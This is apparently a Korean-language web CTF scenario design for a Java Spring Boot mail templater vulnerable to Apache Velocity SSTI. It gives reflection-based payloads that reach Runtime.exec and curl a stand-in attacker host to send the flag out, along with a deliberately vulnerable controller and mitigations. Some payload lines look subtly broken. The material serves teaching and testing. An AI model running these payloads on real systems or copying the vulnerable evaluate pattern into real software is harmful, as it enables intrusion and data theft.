---
title: Java Velocity SSTI and Reflection RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, java, ssti, velocity, reflection, rce, sandbox-escape]
confidence: high
---

# Java Velocity SSTI and Reflection RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Custom Mail Templater (커스텀 메일 템플릿 생성기)
- **난이도**: High
- **핵심 컨셉**: Java 언어 기반 템플릿 엔진인 **Apache Velocity** 환경에서 동적 문자열 렌더링 시 발생하는 **서버사이드 템플릿 인젝션 (SSTI)** 취약점을 이용한 **원격 코드 실행(RCE)** 공격 시나리오입니다. 대상 애플리케이션은 사용자가 직접 작성한 메일 템플릿 문구를 받아 처리합니다. 그러나 개발자는 사용자의 입력을 템플릿 엔진에 안전한 인자로 전달하는 대신, 템플릿 스크립트 문자열 자체와 무작비하게 합쳐 컴파일했습니다. 공격자는 Velocity 템플릿 문법 특성과 자바 리플렉션(Reflection)의 클래스 로더 접근 구조를 연쇄 공략하여, 샌드박스를 우회하고 자바 버추얼 머신(JVM) 레벨에서 OS 쉘 명령을 구동시키는 RCE를 체결합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Mail Template Service (Java Spring Boot + Velocity Engine)**:
  - 사용자가 입력한 알림 템플릿 메시지(`template_content`)를 수신해 가공 렌더링을 시도하는 API.
- **Flag 위치**:
  - 시스템 루트 경로 `/flag`에 파일 형태로 저장되어 있어 RCE를 통해 탈취해야 합니다.

### 2.2 취약점 지점
1. **Direct String Interpolation in Velocity Parser**:
   - 백엔드는 동적으로 넘어온 사용자 문자열을 `Velocity.evaluate()`에 직접 투입해 렌더링을 처리함으로써, 입력 필터가 해제된 날것의 Velocity VTL(Velocity Template Language) 문법이 파서 단에서 실행되는 SSTI 여건이 성립합니다.
2. **Abuse of Java Reflection via Class Loader (Velocity Context)**:
   - Velocity 컨텍스트 환경 내에서 `$class` 지시어 또는 JVM 인스턴스 정보인 `$context` 및 일반 객체의 `getClass()` 인터페이스 조회가 가능합니다.
   - 공격자는 Java 리플렉션을 이용해 `java.lang.Runtime` 클래스의 메타데이터에 접근하고, `getRuntime().exec()` 메소드를 동적으로 호출하는 구문을 작성해 OS 쉘 명령을 가동합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터 포맷 | 핵심 위협 |
|------------|--------|------|----------|-------------|-----------|
| `/api/mail/preview` | POST | 세션 필요 | `template_content` | JSON | Velocity VTL 스크립트 구문 주입 RCE |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. Velocity SSTI 작동 양상 식별
1. 사용자는 임의의 수학 연산 문법을 템플릿 메일에 포함시켜 봅니다.
   - **입력**: `Hello #set($val = 7 * 7) $val`
   - **반환**: `Hello 49`
2. 입력한 연산 구문이 실제로 백엔드 템플릿 엔진(Velocity)에 의해 컴파일 및 연산 출력됨을 식별하고 SSTI 기회를 확정합니다.

### Step 2. 자바 리플렉션(Reflection) 체인 구성
Velocity VTL 스크립트를 통해 `Runtime` 객체를 찾아낼 수 있도록 객체 메서드 체인 및 가젯을 조립합니다.
- Velocity 내부에서 문자열이나 컨텍스트 맵을 통해 클래스에 다가갑니다.
- **VTL 리플렉션 우회 구문 설계**:
  ```velocity
  #set($str = "")
  #set($class = $str.getClass())
  #set($classLoader = $class.forName("java.lang.Runtime"))
  #set($runtime = $classLoader.getRuntime())
  #set($process = $runtime.exec("id"))
  ```
  *(간혹 `java.lang.Runtime` 외에 `java.lang.ProcessBuilder` 클래스를 동적으로 생성하여 생성자에 쉘 인자 배열을 부착해 우회하기도 함)*

### Step 3. RCE 페이로드 전송 및 검증
1. `/flag` 내용을 OOB 방식으로 공격자 리시버로 송출하기 위해 최종 인젝션 페이로드를 조립해 발송합니다.
   - **요청 Body 예시**:
     ```json
     {
       "template_content": "#set($str='')#set($r=$str.getClass().forName('java.lang.Runtime').getRuntime())#set($p=$r.exec('curl http://attacker.local/log?c='+$r.getRuntime().exec('cat /flag')))"
     }
     ```
     *(보다 정확히 `InputStream`을 파이프라인으로 읽어와 버퍼를 덤프하는 VTL 페이로드를 사용할 수도 있으며, 또는 백그라운드 단에서 쉘 curl에 직접 파이프를 엮어 명령 처리함)*
     - **OS 명령어 쉘 기동을 위한 최종 VTL 쿼리 예시**:
       `#set($str='')#set($exec=$str.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://attacker.local/log?c=%25flag_placeholder%25'))`
       *(URL 인코딩 등 적용)*

### Step 4. flag 획득
1. 요청을 수신한 Velocity 파서가 VTL에 맞춰 해당 자바 리플렉션 로직을 컴파일 및 실행합니다.
2. JVM이 `Runtime.getRuntime().exec('curl http://attacker.local/log?...')`를 호출해 OS 명령이 동작하고, 공격자 리시버 웹로그에 플래그 데이터(`FLAG{java_velocity_template_injection_reflection_rce}`)가 송출되어 탈취를 완료합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Java Spring Boot)

```java
// MailController.java (취약한 Velocity 템플릿 처리 Spring Boot 예시)
package com.challenge.mail;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;
import java.io.StringWriter;
import java.util.Map;

@RestController
public class MailController {

    @PostMapping("/api/mail/preview")
    public String previewTemplate(@RequestBody Map<String, String> body) {
        String templateContent = body.get("template_content");
        
        if (templateContent == null) {
            return "{\"error\":\"Empty template content\"}";
        }

        try {
            // Velocity 엔진 초기화
            Velocity.init();
            VelocityContext context = new VelocityContext();
            context.put("username", "GuestUser");

            StringWriter writer = new StringWriter();
            
            // 취약점 지점: 동적으로 들어온 사용자 입력값 templateContent 날것 자체를 
            // 템플릿 코드 인자로 전달하여 evaluate 파싱을 감행
            // 이 과정에서 VTL 스크립트 내부 자바 리플렉션 구문이 그대로 해석 실행됨
            Velocity.evaluate(context, writer, "MailTemplatePatch", templateContent);

            return "{\"status\":\"success\", \"preview\":\"" + writer.toString() + "\"}";
        } catch (Exception e) {
            return "{\"status\":\"error\", \"message\":\"" + e.getMessage() + "\"}";
        }
    }
}
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **사용자 입력의 정적 변수 바인딩 (Template Parameterization)**:
   - 사용자가 작성한 문구 내용 자체는 절대 템플릿 해석 엔진에 구문(`VTL`) 형태로 넘기지 말고, 고정 정의된 템플릿 파일(예: `mail.vm`) 내부에서 사용자 입력을 단순 텍스트 변수 바인딩(`$username` 등)을 통해서만 가져가 렌더링되게 격리합니다.
2. **Velocity 보안 샌드박스 설정 (Secure Uberspector 도입)**:
   - Velocity 설정 파일에 `SecureUberspector` 클래스를 장착하여, VTL 내부에서 위험한 자바 리플렉션 인터페이스인 `Class.getClassLoader()`, `Class.forName()`, `Runtime`, `ProcessBuilder` 객체와 메소드 조회를 강제 원천 에러로 처리 차단합니다.
     ```properties
     # velocity.properties 보안 강화 옵션
     runtime.introspector.uberspect = org.apache.velocity.util.introspection.SecureUberspector
     ```
3. **MIME 및 입력 필터링 가동**:
   - VTL 주입에 쓰이는 대표 지시어 캐릭터인 `#` 및 `$` 문자에 대해 수신 시 정규식 검사를 수행하여 비정상 스크립트 선언을 반려합니다.
